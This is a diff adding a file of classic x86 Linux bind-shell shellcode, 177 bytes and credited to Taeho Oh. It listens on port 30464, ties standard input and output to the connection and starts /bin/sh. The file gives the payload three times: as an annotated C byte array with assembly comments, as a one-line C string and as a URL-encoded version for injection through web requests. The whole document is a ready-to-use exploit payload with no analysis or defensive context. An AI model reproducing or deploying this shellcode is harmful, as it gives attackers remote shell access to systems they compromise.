@@ -1,0 +1,92 @@
+
+char shellcode[]= /* 177 bytes                                   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x85\xc0"                      /* testl %eax,%eax       */
+	"\x75\x43"                      /* jne 0x43              */
+	"\xeb\x43"                      /* jmp 0x43              */
+	"\x5e"                          /* popl %esi             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x06"                      /* movb $0x6,%al         */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x01"                      /* movb $0x1,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+
+	/* bind port= 0x77 = 30464 */
+	"\xb0\x77"                      /* movb $0x77,%al        */
+	"\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+
+	"\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+	"\xb0\x10"                      /* movb $0x10,%al        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x02"                      /* movb $0x2,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xeb\x04"                      /* jmp 0x4               */
+	"\xeb\x55"                      /* jmp 0x55              */
+	"\xeb\x5b"                      /* jmp 0x5b              */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x04"                      /* movb $0x4,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x05"                      /* movb $0x5,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x88\xc3"                      /* movb %al,%bl          */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x01"                      /* movb $0x1,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x02"                      /* movb $0x2,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb8\x2f\x62\x69\x6e"          /* movl $0x6e69622f,%eax */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb8\x2f\x73\x68\x2f"          /* movl $0x2f68732f,%eax */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\x5b\xff\xff\xff";         /* call -0xa5            */
+
+
+
+char shellcode[]="\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+
+/* bindshell port 30464 [Taeho Oh] / 177 bytes / HTML-escaped */
+
+%31%c0%b0%02%cd%80%85%c0%75%43%eb%43%5e%31%c0%31%db%89%f1%b0%02%89%06%b0%01%89%46%04%b0%06%89%46%08%b0%66%b3%01%cd%80%89%06%b0%02%66%89%46%0c%b0%77%66%89%46%0e%8d%46%0c%89%46%04%31%c0%89%46%10%b0%10%89%46%08%b0%66%b3%02%cd%80%eb%04%eb%55%eb%5b%b0%01%89%46%04%b0%66%b3%04%cd%80%31%c0%89%46%04%89%46%08%b0%66%b3%05%cd%80%88%c3%b0%3f%31%c9%cd%80%b0%3f%b1%01%cd%80%b0%3f%b1%02%cd%80%b8%2f%62%69%6e%89%06%b8%2f%73%68%2f%89%46%04%31%c0%88%46%07%89%76%08%89%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%c0%b0%01%31%db%cd%80%e8%5b%ff%ff%ff
+
+
+
